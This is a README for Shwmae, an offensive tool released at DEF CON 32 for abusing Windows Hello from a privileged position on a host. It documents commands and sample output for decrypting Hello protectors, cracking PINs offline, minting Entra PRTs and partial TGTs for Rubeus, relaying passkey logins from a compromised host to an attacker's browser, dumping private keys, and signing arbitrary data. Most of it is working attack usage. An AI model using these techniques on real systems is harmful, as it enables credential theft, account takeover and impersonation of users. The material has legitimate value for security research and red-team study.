# Shwmae

Shwmae (shuh-my) is a Windows Hello abuse tool that was released during DEF CON 32 as part of the Abusing Windows Hello Without a Severed Hand talk.  The purpose of the tool is to abuse Windows Hello from a privileged user context.

```
Shwmae 
Copyright (C) 2024 Shwmae

  enum        (Default Verb) Enumerate Windows Hello protectors, keys and credentials

  sign        Sign data using a Windows Hello protected certificate

  prt         Obtain an Entra PRT and partial TGT usable with Rubeus

  webauthn    Create a webserver to proxy WebAuthn requests from an attacking host

  dump        Dump Windows Hello protected keys when backed by software

  help        Display more information on a specific command.

  version     Display version information.
```

The tool features several modes of operation.

## Enumeration

When no arguments are provided enumeration is the default mode, alternatively you can use the `enum` command.  Enumeration mode will enumerate all Windows Hello containers available, and recursively enumerate all Windows Hello enrolled keys and protectors within the container.  In instances where no TPM is present on the host, a hash is generated for the PIN protector than can be cracked offline using hashcat.  

The biometric protector will be decrypted automatically but the PIN and Recovery protectors can be decrypted using the `/pin` and `/token` arguments respectively.  Only a single protector needs to be decrypted from each container to allow abuse of the Windows Hello keys within that container.

### Example

```
Shwmae

[+] Decrypted SYSTEM vault policy 4bf4c442-9b8a-41a0-b380-dd4a704ddb28 key: 2f662c4708167c02732ae89cd4681557be8c4059b3eab1716bbf20ac5fd000fdd0c5038ce2fc4c89fd6627f45b8e613611e8282d8f38c08e828c023f6b8f060b
[+] Decrypted vault policy:
  Aes128: 3cb7dbc9f920a6df0aab211b67ef673d
  Aes256: 43642515f325f55c332d14e0295d3ad43dfdb05324fadb7bea687f1a9e0e6ecd

GINGE\mary.gruber (S-1-5-21-1003644063-402998240-3342588708-1111)

  Provider              : Microsoft Platform Crypto Provider
  Protected Recovery Key: eyJWZXJzaW9uIjoxLCJQcm90ZWN0ZW...
  Recovery Key          : Use /token argument to decrypt recovery key

  ** Protectors **

    Type           : Pin
    Pin Type       : Numeric
    Length         : 8
    Decrypted      : Supply /pin argument to attempt decryption

    Type           : Bio
    Encryption Type: Aes
    GCM Nonce      : cacf46896844d3f96a55fd8c
    GCM AuthData   : 01000000200000000c000000b400000010000000cacf46896844d3f96a55fd8c
    GCM Tag        : f5d6d1c3e35f944038e03013851d6d69
    Decrypted      : True (Bio Key Correct)
    ExtPin         : 0f28b81e36b0446cf0deb9ca680c05aeb7b7129ab830936fce3836bbd520ee94
    DecryptPin     : c63e6e0c199cedff0a086277894f85f510305cef6d4c6ac7efc21bb122f537b1
    SignPin        : 855b2d32d62a4dafb50d47838d4ce13f8d7d6871718e384d6db22b407ecb05a3

    Type           : Recovery
    IV             : 49b2c5b8416e5563387e10a8a3d9ae68

  ** Credentials **

    Resource         : WinBio Key Resource
    SID              : S-1-5-21-1003644063-402998240-3342588708-1111
    Protector Key    : 59e87b8c63973fb3bfd322016a61e33b59a569c22f9aad22d4c91b6db75bcf52

  ** Keys **

    Name             : login.windows.net/de60a4fa-d583-4eb0-ab66-ce358af8279c/mary.gruber@ethicalchaos.dev
    Provider         : Microsoft Platform Crypto Provider
    Key Id           : {B8EF94E6-23EE-42D3-B8DB-BC0AC5EF1824}
    Key File         : 1d3ddd8ac0d04ae299673cd1ffb19b90cc2e277d.PCPKEY
    Azure Tenant Id  : de60a4fa-d583-4eb0-ab66-ce358af8279c
    Azure User       : mary.gruber@ethicalchaos.dev
    Azure kid        : l5Ov1EluHGcTl/MCwWooU71x0+sHBs78M1Ts9szdNEw=

    Name             : FIDO_AUTHENTICATOR//3aeb002460381c6f258e8395d3026f571f0d9a76488dcd837639b13aed316560_fda42d8889ba587fc7fa202a2e6d91ffad4642abb9c2bd75ea9f906be188925126bdf07d591267672cc2fa79b0750de2437b1d77d6f924af1b4992f4e3527bb0
    Provider         : Microsoft Platform Crypto Provider
    Key Id           : {36E18DBB-52AC-4198-BD34-55B3490A575C}
    Key File         : 979dffb30e1a28d7d6c6c1a5e55c383db8d04dbd.PCPKEY
    FIDO Relay Party : github.com
    FIDO Public Key  : RUNTMSAAAADkOpq228W7gXH3VTLeCwScNAyJHFmchJjCZass71QHqCyStIrQWry6m-5XK8HTAdU31UXmkuEI6fjdSmGOtWGR
    FIDO Cred Id     : qhdzMrPMlH-Fg_sdpNiKhuVpnSd__p1vDN41O3Ip3co
    FIDO User Id     : _aQtiIm6WH_H-iAqLm2R_61GQqu5wr116p-Qa-GIklEmvfB9WRJnZyzC-nmwdQ3iQ3sdd9b5JK8bSZL041J7sA
    FIDO User        : mary-gruber
    FIDO Display Name: mary-gruber
    FIDO Sign Count  : 2

    Name             : //9DDC52DB-DC02-4A8C-B892-38DEF4FA748F (Vault Key)
    Provider         : Microsoft Software Key Storage Provider
    Key Id           : {7418B315-A00B-4113-A0EC-5C51718D11C5}
    Key File         : fc65330b205c133f00d035ea9e8dfba6_2a155d6c-838c-43f5-b943-b21cc30532d7

    Name             : //CA00CFA8-EB0F-42BA-A707-A3A43CDA5BD9
    Provider         : Microsoft Software Key Storage Provider
    Key Id           : {696644C4-EA34-400C-99D2-8B5E38095AA6}
    Key File         : c4b537d879e21b5d6f797517912be27b_2a155d6c-838c-43f5-b943-b21cc30532d7
```

## PRT 

The PRT operating mode facilitates generating an initial PRT and renewing existing PRT's via the `prt` command by utilizing any Entra enrolled Windows Hello keys.  If cloud trust is enabled within the tenant, the cloud TGT is decrypted and can be used to authenticate as the user against on premises Active Directory using Rubeus. 

### Initial PRT Example

```
Shwmae prt --sid S-1-5-21-1003644063-402998240-3342588708-1111
[+] Decrypted SYSTEM vault policy 4bf4c442-9b8a-41a0-b380-dd4a704ddb28 key: 2f662c4708167c02732ae89cd4681557be8c4059b3eab1716bbf20ac5fd000fdd0c5038ce2fc4c89fd6627f45b8e613611e8282d8f38c08e828c023f6b8f060b
[+] Decrypted vault policy:
  Aes128: 3cb7dbc9f920a6df0aab211b67ef673d
  Aes256: 43642515f325f55c332d14e0295d3ad43dfdb05324fadb7bea687f1a9e0e6ecd
[=] Found Azure key with UPN mary.gruber@ethicalchaos.dev and kid l5Ov1EluHGcTl/MCwWooU71x0+sHBs78M1Ts9szdNEw=
[+] Successfully decrypted NGC key set from protector type Bio
    Transport Key    : SK-4eed430d-3568-3005-69ca-6967fac4ba9c
    PRT              : 0.AS8A-qRg3oPVsE6rZs41ivgnnIc7qjhtoBdIsnV6MWmI2TsvABc.AgABAwEAAAA....xDuWvx
    PRT Session Key  : AQCeykYwMRUg0d.....uOteU9zR8tCw
    PRT Random Ctx   : 71f7b1a2f4a53a55f39254d3970727104b4d6557040e2b8f
    PRT Derived Key  : 8314d5d03cfcda825edd2f145083504ccef698beb3beff78658240e96158fee0
    Partial TGT      : doIGEjCCBg6gAwIBBaEDAgEWooIE4TC...TZaowUCAwwWuw==
```

### Renewal PRT Example

For PRT renewals the PRT and session key are required from the initial PRT request.

```Shwmae prt --sid S-1-5-21-1003644063-402998240-3342588708-1111 -r --prt 0.AS8A-qRg3oPVsE6rZ....RRjDl --session-key AQCeykYwMR.....9zR8tCw
[+] Decrypted SYSTEM vault policy 4bf4c442-9b8a-41a0-b380-dd4a704ddb28 key: 2f662c4708167c02732ae89cd4681557be8c4059b3eab1716bbf20ac5fd000fdd0c5038ce2fc4c89fd6627f45b8e613611e8282d8f38c08e828c023f6b8f060b
[+] Decrypted vault policy:
  Aes128: 3cb7dbc9f920a6df0aab211b67ef673d
  Aes256: 43642515f325f55c332d14e0295d3ad43dfdb05324fadb7bea687f1a9e0e6ecd
    Transport Key    : SK-4eed430d-3568-3005-69ca-6967fac4ba9c
    PRT              : 0.AS8A-qRg3oPVsE6rZs41ivgnnIc7qjhtoBdIsnV6MWmI2TsvABc.AgABAwEAAAA....xDuWvx
    PRT Session Key  : AQCeykYwMRUg0d.....uOteU9zR8tCw
    PRT Random Ctx   : 71f7b1a2f4a53a55f39254d3970727104b4d6557040e2b8f
    PRT Derived Key  : 8314d5d03cfcda825edd2f145083504ccef698beb3beff78658240e96158fee0
    Partial TGT      : doIGEjCCBg6gAwIBBaEDAgEWooIE4TC...TZaowUCAwwWuw==
```

## WebAuthn

The WebAuthn operating mode sets up a simple web API via the `webauthn` command that will accept WebAuthn assertion requests from the ShwmaeExt web browser extension from another host.    

Once the WebAuthn HTTP listener is setup on a compromised host, which defaults to listening on port 8000, you can install the ShwmaeExt within an attacking browser.  Once you set the listener URL within the extension, you can login via Passkey authentication using any credentials available from the compromised host.  You can find the exploded extension inside the `ShwmaeExt` folder.

### Example

```Shwmae webauthn
[+] Decrypted SYSTEM vault policy 4bf4c442-9b8a-41a0-b380-dd4a704ddb28 key: 2f662c4708167c02732ae89cd4681557be8c4059b3eab1716bbf20ac5fd000fdd0c5038ce2fc4c89fd6627f45b8e613611e8282d8f38c08e828c023f6b8f060b
[+] Decrypted vault policy:
  Aes128: 3cb7dbc9f920a6df0aab211b67ef673d
  Aes256: 43642515f325f55c332d14e0295d3ad43dfdb05324fadb7bea687f1a9e0e6ecd
[=] WebAuthn proxy running, press enter to exit
```

## Dump

The `dump` command can be used for extracting Windows Hello backed private keys that are backed by the Software Key Storage provider.  You cannot use this mode to extract keys that are backed by the Platform Key Storage Provider.

### Example

```
Shwmae.exe dump --key-name login.windows.net/de60a4fa-d583-4eb0-ab66-ce358af8279c/mary.gruber@ethicalchaos.devst
```

## Sign

The `sign` command can be used for signing arbitrary data with a specific key.  This mode can be useful in scenarios where no specific integration exists within the tool.

The `--key-name` argument is used to target the specific Windows Hello key pair to use and the `--data` argument is used to calculate the signature.  The data should be presented as a Base64 encoded string, but the string is first decoded to binary prior to generating the signature.  The binary signature is converted to Base64 and printed to the console.  

### Example

```
Shwmae.exe sign --key-name login.windows.net/de60a4fa-d583-4eb0-ab66-ce358af8279c/mary.gruber@ethicalchaos.dev --data AAAAAA
[+] Decrypted SYSTEM vault policy 4bf4c442-9b8a-41a0-b380-dd4a704ddb28 key: 2f662c4708167c02732ae89cd4681557be8c4059b3eab1716bbf20ac5fd000fdd0c5038ce2fc4c89fd6627f45b8e613611e8282d8f38c08e828c023f6b8f060b
[+] Decrypted vault policy:
  Aes128: 3cb7dbc9f920a6df0aab211b67ef673d
  Aes256: 43642515f325f55c332d14e0295d3ad43dfdb05324fadb7bea687f1a9e0e6ecd
[=] Found key in container 1f75e567-63ab-4f90-b1f6-cfc30b399085 for user GINGE\mary.gruber (S-1-5-21-1003644063-402998240-3342588708-1111)
[+] Successfully decrypted NGC key set from protector type Bio
[+] Success:
MogfSZKrtYs9kfy0jPrVODpu4/eJfXHvGu+TQJzf9JG9JMug2+rmG7zEBuzUunMVy7jyHSBwv1eQ78yQr/G5y0VfoeKYnW5UbKuO9ZnImTuIFem4RE7RhQ84Pm4BgEQ3W16ebcf5CIHnIOZpOec6nbh7WZBIi2AG8N5fWK9itWA1Uk7j1TAFO7gCfAbrE9O6KiMLe4AAdw2vjR5s9RVqw1MdacWKOBDwGVm+VmHY6kYXSCovyWJ+ESoi75fRfRSgyPcHViNOP77pnUDOeMfl9nsE6C0UEKSCvJ+GGJy3u5uiK5fC1w73TG8s/Y2O6YSJpjnXqC5ZJhrE/vLtJNtGWg==
```